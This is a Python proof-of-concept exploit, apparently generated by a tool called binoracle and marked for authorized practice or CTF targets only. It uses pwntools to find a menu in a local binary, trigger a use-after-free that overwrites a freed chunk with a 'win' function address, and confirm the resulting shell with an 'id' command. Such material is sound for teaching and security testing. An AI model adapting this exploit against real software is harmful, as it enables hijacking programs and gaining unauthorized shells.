#!/usr/bin/env python3
# PoC real generado por binoracle (binoracle.workflows.autouaf._DRIVER)
# Target: samples/bin/uaf
# Uso: python3 uaf_use_after_free.py samples/bin/uaf
# SOLO objetivos autorizados (practica/CTF propio).
import re
import subprocess
import sys
from pwn import *
context.binary = elf = ELF(sys.argv[1], checksec=False); context.log_level = "error"
win = (elf.symbols or {}).get("win")
if not win:
    print("NOT_APPLICABLE (no win)"); sys.exit(1)

KEYWORDS = {
    "new": ("new", "alloc", "add", "create"),
    "free": ("free", "del", "remove"),
    "write": ("edit", "note", "write", "set", "update", "modify"),
    "trigger": ("run", "use", "call", "exec", "trigger"),
}
menu_line = None
opts = None
for raw in re.findall(rb"[ -~]{6,}", elf.data):
    s = raw.decode("latin1")
    toks = re.findall(r"(\d+)\s*\)\s*([A-Za-z_]+)", s)
    if len(toks) < 3:
        continue
    cand = {}
    for num, word in toks:
        wl = word.lower()
        for cat, kws in KEYWORDS.items():
            if cat not in cand and any(kw in wl for kw in kws):
                cand[cat] = int(num)
    if all(c in cand for c in ("new", "free", "write", "trigger")):
        menu_line, opts = raw, cand
        break
if not opts:
    print("NOT_APPLICABLE (no se reconocio un menu new/free/write/trigger)"); sys.exit(1)

SIZES = [16, 24, 32, 40, 48, 56, 64, 8]
ok = False
for sz in SIZES:
    io = None
    try:
        io = process([elf.path], stderr=subprocess.STDOUT)
        io.recvuntil(menu_line, timeout=3)
        io.sendline(str(opts["new"]).encode())
        io.recvuntil(menu_line, timeout=3)
        io.sendline(str(opts["free"]).encode())
        io.recvuntil(menu_line, timeout=3)
        io.sendline(str(opts["write"]).encode())
        io.recv(timeout=0.5)
        io.send(p64(win).ljust(sz, b"A"))
        io.recvuntil(menu_line, timeout=3)
        io.sendline(str(opts["trigger"]).encode())
        io.sendline(b"echo BINORACLE_PWNED; id")
        out = io.recvrepeat(2.5)
        io.close()
    except Exception:
        try:
            if io:
                io.close()
        except Exception:
            pass
        continue
    if b"BINORACLE_PWNED" in out or b"uid=" in out:
        print("VERIFIED win=%#x size=%d opts=%s" % (win, sz, opts))
        ok = True
        break
if not ok:
    print("NOT_VERIFIED win=%#x opts=%s" % (win, opts))
    sys.exit(1)
